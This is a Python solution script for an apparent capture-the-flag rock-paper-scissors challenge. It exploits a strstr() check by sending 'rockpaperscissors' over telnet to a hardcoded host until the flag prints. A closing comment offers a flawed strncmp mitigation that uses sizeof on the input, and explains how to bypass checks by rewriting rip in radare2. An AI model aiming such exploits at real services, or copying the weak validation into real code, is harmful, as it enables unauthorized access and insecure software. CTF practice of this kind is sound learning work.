"""
The program checks if we sent 'anything in our string' that can beat the opponent (this is how the strstr() function works on line 100).
So we just send "rockpaperscissors" and beat them everytime.
"""

import telnetlib
import re

tn = telnetlib.Telnet("18.217.86.78", 53865, timeout = 2)
print("Connection established! \n")


def main():
	seq = 1
	while True:
		output = tn.read_until(b'program\r\n')
		if b"pico" in output:
			output = re.sub("^.*pico", "pico", str(output))
			print(re.sub("}.*$", "}", str(output)))
			break

		tn.write(b'1\n')

		output = tn.read_until(b':\r\n')

		tn.write(b'rockpaperscissors\n')
		
		print(f"Win {seq} times")	
		seq += 1
main()


"""
I tried (with my mere knowledge) mitigating this by checking the user input. If it's anything other than "rock", "paper" or "scissors", we exit.
```
# str'n'cmp is safer than strcmp because it allows you to control user input length. (buffer overflow problems)
  if(strncmp(player_turn, "rock", sizeof(player_turn)) == 0) {
    printf("Welcome");

  } else if(strncmp(player_turn, "paper", sizeof(player_turn)) == 0) {
    printf("Welcome");

  } else if(strncmp(player_turn, "scissors", sizeof(player_turn)) == 0) {
    printf("Welcome");

  } else {
    printf("No you don't!");
    exit(0);
  }
```
  
  
But I mananged to exploit it locally (I don't know if we can still exploit on a server) by manipulating it's code flow using radare
(I feel like cheating when I use it. Awesome tool!)

You can try it yourself;
1- Compile our modified C program
2- Open radare2 with debug option
2- Set up a breakpoint in the play function at the address where the first if statement occurs.
3- Run the program
4- When it stops, change the value of rip (or eip for 32 bit systems) to the address where "Welcome" is printed.
5- Repeate this 5 more times.
This way we will bypass all those if checks.

Still, you can modify your program so that it will not allow debuggers to interract with it but I'm not going to bother doing it. 
"""
